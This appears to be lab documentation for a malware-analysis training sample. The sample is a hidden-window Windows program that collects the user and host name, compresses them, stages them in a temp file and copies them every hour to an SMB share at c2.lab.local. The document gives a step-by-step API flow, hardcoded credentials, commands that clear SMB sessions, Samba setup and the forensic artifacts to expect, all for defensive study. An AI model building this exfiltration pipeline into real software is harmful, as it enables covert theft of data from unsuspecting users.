# A04.4d Staged Compressed SMB Data Exfiltration

## Summary

Collects basic host identity information, serializes the collected
data as JSON, compresses the JSON in memory, stages the compressed
payload as a local file, and transfers the staged file to a controlled
SMB share using explicit credentials and a direct UNC path.

The sample demonstrates a multi-stage data-exfiltration pipeline
commonly associated with information stealers, spyware, remote-access
trojans, and post-exploitation tooling that prepares collected data
before transferring it through a network file share.

The exfiltration workflow performs the following operations:

* Retrieves the current Windows user name
* Retrieves the local computer name
* Generates a local execution timestamp
* Constructs structured JSON records
* Compresses each JSON record in memory
* Writes the compressed data to a local staging file
* Cancels conflicting SMB sessions
* Authenticates directly to a controlled SMB share
* Copies the staged archive to a remote UNC path
* Disconnects the authenticated SMB session
* Creates a background worker thread
* Repeats the staging and transfer process once every hour
* Keeps the process active for continued transmission

Compression is implemented using the Windows Compression API:

```text
CreateCompressor()
Compress()
CloseCompressor()
```

SMB authentication is implemented using:

```text
WNetAddConnection2A()
```

The file transfer is performed using:

```text
CopyFileA()
```

All network communication is directed to the controlled laboratory
hostname:

```text
c2.lab.local
```

No real external command-and-control infrastructure is contacted.

---

## Payload Summary

The payload behavior consists of collecting basic system identity
information, formatting it as JSON, compressing it, staging it on
disk, and copying the resulting archive to an authenticated SMB share.

### Initial Login Information Record

Immediately after execution, the sample creates a JSON record
containing:

* Current user name
* Computer name
* Execution timestamp

The JSON is compressed and written to:

```text
C:\Windows\Temp\stage.lz
```

The staged file is then copied to:

```text
\\c2.lab.local\sharestage\report.lz
```

### Periodic Location Heartbeat Record

After the initial transfer, the sample creates a background worker
thread that repeats the operation once every hour.

The heartbeat record contains:

* Current user name
* Computer name
* Static status value
* Current timestamp

The static status value is:

```text
location_heartbeat
```

The sample does not collect geographic coordinates. The location
record functions only as controlled telemetry.

No persistence, credential extraction, privilege escalation, file
encryption, or destructive functionality is performed.

---

## Local and Remote Paths

### Local Staging File

```text
C:\Windows\Temp\stage.lz
```

### Remote SMB Share

```text
\\c2.lab.local\sharestage
```

### Remote Destination File

```text
\\c2.lab.local\sharestage\report.lz
```

The local staging file is overwritten each time the sample executes
the exfiltration routine.

The remote file is also overwritten because `CopyFileA()` is called
with:

```text
bFailIfExists = FALSE
```

---

## SMB Authentication Profile

The sample uses the following controlled laboratory credentials:

```text
Username: smbuser
Password: LabPassword123
```

The credentials are supplied directly to:

```text
WNetAddConnection2A()
```

The sample does not map the share to a drive letter.

Instead, it sets:

```text
lpLocalName = NULL
```

and authenticates directly to the remote UNC resource:

```text
\\c2.lab.local\sharestage
```

This creates an authenticated network connection without assigning a
local drive such as `Z:`.

---

## Compression Configuration

The sample creates a compressor using:

```text
COMPRESS_ALGORITHM_MSZIP | COMPRESS_RAW
```

The `COMPRESS_ALGORITHM_MSZIP` option selects the Microsoft ZIP-style
compression algorithm.

The `COMPRESS_RAW` flag requests compressed output without the normal
Windows Compression API framing metadata.

The compression operation uses a two-call pattern:

1. Call `Compress()` with no output buffer to determine the required
   buffer size
2. Allocate the required buffer
3. Call `Compress()` again to generate the compressed output

The compressed buffer is allocated using:

```text
malloc()
```

and released using:

```text
free()
```

---

## To Execute A04_4d

### Step 1 — Confirm laboratory name resolution

From the Windows analysis VM:

```powershell
Resolve-DnsName c2.lab.local
```

The hostname should resolve to the controlled SMB server.

Example:

```text
192.168.67.5
```

### Step 2 — Confirm SMB connectivity

Test access to the server:

```powershell
Test-NetConnection c2.lab.local -Port 445
```

Expected result:

```text
TcpTestSucceeded : True
```

### Step 3 — Clear conflicting SMB sessions

Windows does not normally permit simultaneous connections to the
same server using different credentials.

Display active SMB connections:

```powershell
Get-SmbConnection
```

Remove existing mapped SMB connections when necessary:

```powershell
net use * /delete /y
```

To tear down all SMB client connections by restarting the workstation
service:

```powershell
Restart-Service LanmanWorkstation
```

Confirm that no active SMB connections remain:

```powershell
Get-SmbConnection
```

Restarting `LanmanWorkstation` interrupts existing SMB sessions on
the analysis machine and should therefore only be used in the
controlled laboratory environment.

### Step 4 — Launch the SMB exfiltration sample

```powershell
.\A04-Credential-Theft-Spyware-Keylogger\A04_4d\bin\A04_4d_Compressed_SMB_Exfil.exe
```

The sample does not require command-line arguments.

The console window is hidden during execution.

### Step 5 — Allow the initial transfer to complete

The sample should:

1. Create the JSON record
2. Compress the JSON in memory
3. Write `stage.lz`
4. Authenticate to the SMB share
5. Copy the file to `report.lz`
6. Disconnect from the share

### Step 6 — Terminate the sample after artifact collection

The process remains active to support hourly heartbeat transfers.

Terminate it manually after the required dynamic artifacts have been
captured.

For example:

```powershell
Stop-Process -Name A04_4d_Compressed_SMB_Exfil
```

---

## Expected Initial JSON Record

Before compression, the initial payload resembles:

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "login_time": "2026-07-30 13:45:12"
}
```

The source code creates the compact equivalent:

```text
{"username":"lab-user","computer_name":"WIN11-LAB","login_time":"2026-07-30 13:45:12"}
```

---

## Expected Heartbeat JSON Record

Before compression, the periodic heartbeat resembles:

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "status": "location_heartbeat",
  "time": "2026-07-30 14:45:12"
}
```

The source code creates the compact equivalent:

```text
{"username":"lab-user","computer_name":"WIN11-LAB","status":"location_heartbeat","time":"2026-07-30 14:45:12"}
```

---

## Expected Local Filesystem Artifact

The local staging file should appear at:

```text
C:\Windows\Temp\stage.lz
```

Expected operations include:

```text
CreateFileA()
WriteFile()
CloseHandle()
```

The file is created using:

```text
CREATE_ALWAYS
```

Therefore, an existing staging file is overwritten during each
transfer cycle.

The sample does not delete the local staging file after the SMB
transfer completes.

As a result, the latest compressed payload should remain available
for filesystem and forensic analysis.

---

## Expected Remote Artifact

On the Linux SMB server, the transferred file should appear in the
directory backing the share.

Example:

```text
/srv/sharestage/report.lz
```

Confirm the file exists:

```bash
sudo ls -l /srv/sharestage/
```

Example output:

```text
-rwxr--r-- 1 smbuser smbuser 92 Jul 30 14:45 report.lz
```

The exact size depends on the host name, user name, timestamp, and
compression result.

---

## Decompress the Remote Artifact

The compressed file can be decompressed using Python and `zlib`.

```bash
python3 -c "import zlib; print(zlib.decompress(open('/srv/sharestage/report.lz', 'rb').read()[2:], -15).decode('utf-8'))"
```

Example decoded output:

```json
{"username":"misha.kurtz","computer_name":"WIN_VM","status":"location_heartbeat","time":"2026-06-16 14:37:06"}
```

The command performs the following operations:

1. Opens `report.lz` as binary data

2. Removes the first two bytes

3. Decompresses the remaining raw Deflate stream using:

   ```text
   wbits = -15
   ```

4. Decodes the decompressed bytes as UTF-8

5. Prints the original JSON record

The two-byte removal reflects the framing produced by this specific
MSZIP and raw-compression combination. The exact decompression method
should be validated against the artifact produced by the compiled
sample.

---

## Expected Dynamic Artifacts

### Process Activity

The sample creates:

* Main executable process
* Background worker thread

Relevant APIs include:

```text
CreateThread()
Sleep()
```

The main thread remains active using repeated 10-second sleep
intervals.

The worker thread sleeps for:

```text
3,600,000 milliseconds
```

This corresponds to one hour between transfer cycles.

### Filesystem Activity

Expected local filesystem operations include:

```text
CreateFileA
WriteFile
CloseHandle
```

Expected local path:

```text
C:\Windows\Temp\stage.lz
```

Expected remote filesystem operation:

```text
CopyFileA
```

Expected remote path:

```text
\\c2.lab.local\sharestage\report.lz
```

Procmon may represent the UNC path using redirector-oriented paths
similar to:

```text
\Device\Mup\c2.lab.local\sharestage\report.lz
```

### DNS Activity

The sample resolves:

```text
c2.lab.local
```

Expected DNS behavior includes:

* DNS query for `c2.lab.local`
* DNS response containing the SMB server address

### SMB Network Activity

Expected network behavior includes:

* Outbound TCP connection to port 445
* SMB protocol negotiation
* Session setup
* User authentication
* Tree connection to `sharestage`
* Remote file creation
* File write operations
* File close operation
* Tree disconnect
* SMB session termination

Depending on the SMB version and negotiated settings, packet contents
may be partially or fully encrypted.

### Authentication Activity

The sample attempts to authenticate using:

```text
WNetAddConnection2A()
```

The remote resource is:

```text
\\c2.lab.local\sharestage
```

Potential authentication-related artifacts include:

* SMB session setup events
* NTLM or Kerberos authentication traffic
* Windows logon events
* Samba authentication logs
* Credential conflict errors
* Network-provider activity

### Compression Activity

Relevant compression APIs include:

```text
CreateCompressor
Compress
CloseCompressor
```

Relevant constants include:

```text
COMPRESS_ALGORITHM_MSZIP
COMPRESS_RAW
```

### SMB Session Cleanup

Before authentication, the sample calls:

```text
WNetCancelConnection2A()
```

to clear an existing connection to the same share.

After the file transfer, it calls the same API again to terminate the
authenticated session.

---

# High-Level Staging, Compression, and SMB Exfiltration Flow

1. Start the SMB exfiltration executable

   ```text
   A04_4d_Compressed_SMB_Exfil.exe
   ```

2. Hide the console window using:

   ```text
   ShowWindow(SW_HIDE)
   ```

3. Retrieve the current user name using:

   ```text
   GetUserNameA()
   ```

4. Retrieve the local computer name using:

   ```text
   GetComputerNameA()
   ```

5. Generate a local timestamp using:

   ```text
   time()
   localtime_s()
   strftime()
   ```

6. Construct a compact JSON record containing:

   * User name
   * Computer name
   * Login timestamp

7. Calculate the raw JSON payload size

8. Create a compression context using:

   ```text
   CreateCompressor()
   ```

9. Select:

   ```text
   COMPRESS_ALGORITHM_MSZIP | COMPRESS_RAW
   ```

10. Call `Compress()` without an output buffer to determine the
    required compressed-buffer size

11. Allocate the compressed buffer using:

    ```text
    malloc()
    ```

12. Compress the JSON record in memory using:

    ```text
    Compress()
    ```

13. Close the compressor using:

    ```text
    CloseCompressor()
    ```

14. Create or overwrite the local staging file:

    ```text
    C:\Windows\Temp\stage.lz
    ```

    using:

    ```text
    CreateFileA()
    ```

15. Write the compressed payload using:

    ```text
    WriteFile()
    ```

16. Close the staging-file handle

17. Release the in-memory compressed buffer using:

    ```text
    free()
    ```

18. Cancel any existing connection to:

    ```text
    \\c2.lab.local\sharestage
    ```

    using:

    ```text
    WNetCancelConnection2A()
    ```

19. Initialize a `NETRESOURCEA` structure

20. Set the resource type to:

    ```text
    RESOURCETYPE_DISK
    ```

21. Leave `lpLocalName` as `NULL` to avoid drive-letter mapping

22. Set the remote resource to:

    ```text
    \\c2.lab.local\sharestage
    ```

23. Authenticate using:

    ```text
    WNetAddConnection2A()
    ```

24. Supply the controlled laboratory credentials:

    ```text
    smbuser
    LabPassword123
    ```

25. Establish an authenticated SMB session

26. Copy the local staging file:

    ```text
    C:\Windows\Temp\stage.lz
    ```

    to:

    ```text
    \\c2.lab.local\sharestage\report.lz
    ```

    using:

    ```text
    CopyFileA()
    ```

27. Allow an existing remote `report.lz` file to be overwritten

28. Disconnect from the SMB share using:

    ```text
    WNetCancelConnection2A()
    ```

29. Create a background worker thread using:

    ```text
    CreateThread()
    ```

30. Construct a heartbeat JSON record containing:

    * User name
    * Computer name
    * `location_heartbeat` status
    * Current timestamp

31. Compress the heartbeat record in memory

32. Overwrite the local staging file

33. Reauthenticate to the SMB share

34. Overwrite the remote `report.lz` file

35. Disconnect from the SMB share

36. Pause the worker thread for one hour using:

    ```text
    Sleep(3600000)
    ```

37. Repeat the staging and transfer process indefinitely

38. Keep the main thread active using repeated calls to:

    ```text
    Sleep(10000)
    ```

39. Continue execution until the process is manually terminated

---

# SMB Server Laboratory Configuration

## Step 1 — Create the Share Directory

On the Linux SMB server:

```bash
sudo mkdir -p /srv/sharestage
```

Assign ownership to the controlled SMB account:

```bash
sudo chown smbuser:smbuser /srv/sharestage
```

Set directory permissions:

```bash
sudo chmod 770 /srv/sharestage
```

---

## Step 2 — Create the SMB User

Create the local Linux account when it does not already exist:

```bash
sudo useradd -M -s /usr/sbin/nologin smbuser
```

Add the account to Samba:

```bash
sudo smbpasswd -a smbuser
```

Enter the controlled laboratory password:

```text
LabPassword123
```

Enable the Samba account:

```bash
sudo smbpasswd -e smbuser
```

---

## Step 3 — Configure the Samba Share

Edit the Samba configuration:

```bash
sudo nano /etc/samba/smb.conf
```

Add the following share definition:

```ini
[sharestage]
    path = /srv/sharestage
    browseable = yes
    writable = yes
    read only = no
    guest ok = no
    valid users = smbuser
    create mask = 0660
    directory mask = 0770
```

Validate the Samba configuration:

```bash
testparm
```

Restart Samba:

```bash
sudo systemctl restart smbd
```

Confirm the service is active:

```bash
sudo systemctl status smbd
```

---

## Step 4 — Permit SMB Through the Firewall

When UFW is enabled:

```bash
sudo ufw allow from 192.168.67.0/24 to any port 445 proto tcp
```

Confirm the rule:

```bash
sudo ufw status
```

Port 445 should only be exposed to the isolated malware-analysis
network.

---

## Step 5 — Test Authentication from Windows

From the Windows analysis VM:

```powershell
net use \\c2.lab.local\sharestage /user:smbuser LabPassword123
```

Confirm the connection:

```powershell
Get-SmbConnection
```

Test file creation:

```powershell
"SMB test" | Set-Content \\c2.lab.local\sharestage\manual_test.txt
```

Remove the test connection:

```powershell
net use \\c2.lab.local\sharestage /delete
```

---

## Step 6 — Monitor the Share

List transferred files:

```bash
sudo ls -l /srv/sharestage/
```

Monitor changes continuously:

```bash
sudo watch -n 1 ls -l /srv/sharestage/
```

Inspect Samba logs:

```bash
sudo tail -f /var/log/samba/log.smbd
```

Host-specific Samba logs may also be available under:

```text
/var/log/samba/
```

---

## Step 7 — Decompress the Captured Payload

Use:

```bash
python3 -c "import zlib; print(zlib.decompress(open('/srv/sharestage/report.lz', 'rb').read()[2:], -15).decode('utf-8'))"
```

Expected output:

```json
{"username":"misha.kurtz","computer_name":"WIN_VM","status":"location_heartbeat","time":"2026-06-16 14:37:06"}
```

---

## Step 8 — Reset the Share Before Another Run

Remove the previous remote artifact:

```bash
sudo rm -f /srv/sharestage/report.lz
```

Remove the local staging file from the Windows analysis VM:

```powershell
Remove-Item C:\Windows\Temp\stage.lz -Force
```

Clear active SMB connections:

```powershell
net use * /delete /y
```

Confirm no connections remain:

```powershell
Get-SmbConnection
```

---

#########################################################################

# Expected Procmon, Sysmon, PCAP, and Samba Evidence

## Procmon

Expected operations may include:

```text
CreateFile
WriteFile
CloseFile
TCP Connect
TCP Send
TCP Receive
```

Relevant paths include:

```text
C:\Windows\Temp\stage.lz
\\c2.lab.local\sharestage\report.lz
```

The remote path may appear through the Windows Multiple UNC Provider:

```text
\Device\Mup\c2.lab.local\sharestage\report.lz
```

## Sysmon

Depending on the active Sysmon configuration, expected events may
include:

* Process creation
* DNS query for `c2.lab.local`
* Network connection to TCP port 445
* Local file creation
* Local file overwrite

The SMB file operation may not appear as an ordinary local file-create
event because it is handled through the network redirector.

## PCAP

A packet capture should show:

1. DNS query for:

   ```text
   c2.lab.local
   ```

2. DNS response containing the SMB server address

3. TCP three-way handshake to:

   ```text
   TCP port 445
   ```

4. SMB protocol negotiation

5. SMB session setup

6. Authentication exchange

7. Tree connection to:

   ```text
   \\c2.lab.local\sharestage
   ```

8. Remote file create request for:

   ```text
   report.lz
   ```

9. SMB write operations containing the compressed payload

10. File close request

11. Tree disconnect

12. Session logoff or TCP connection termination

## Samba

Expected server-side evidence includes:

* Successful authentication for `smbuser`
* Connection to `sharestage`
* Creation or overwrite of `report.lz`
* File write activity
* Share disconnection

---

## Primary Static Analysis Indicators

Important path and credential strings include:

```text
C:\Windows\Temp\stage.lz
\\c2.lab.local\sharestage
\\c2.lab.local\sharestage\report.lz
smbuser
LabPassword123
location_heartbeat
```

Important compression imports include:

```text
CreateCompressor
Compress
CloseCompressor
```

Important local file APIs include:

```text
CreateFileA
WriteFile
CloseHandle
```

Important SMB and network-provider APIs include:

```text
WNetAddConnection2A
WNetCancelConnection2A
CopyFileA
```

Additional imports include:

```text
GetUserNameA
GetComputerNameA
CreateThread
Sleep
ShowWindow
GetConsoleWindow
```

Together, these artifacts represent the transition:

```text
local host identity
        ↓
JSON serialization
        ↓
in-memory MSZIP compression
        ↓
local staging file
        ↓
authenticated SMB session
        ↓
UNC file transfer
        ↓
remote compressed archive
```

---

## Behavioral Distinction from A04_4a–A04_4c

### A04_4a

```text
JSON → HTTP POST → port 80
```

### A04_4b

```text
form fields → HTTP POST → port 80
```

### A04_4c

```text
JSON → Base64 → HTTPS POST → port 443
```

### A04_4d

```text
JSON
  ↓
native compression
  ↓
local staging file
  ↓
authenticated SMB connection
  ↓
UNC file transfer over port 445
```

A04_4d introduces several additional analytical stages:

* In-memory compression
* Local disk staging
* Explicit SMB credentials
* Authenticated network-share access
* Remote file creation
* UNC-based data transfer
* Local and remote forensic artifacts

This produces a richer artifact chain spanning process, filesystem, authentication, DNS, SMB, packet-capture, and server-side evidence.
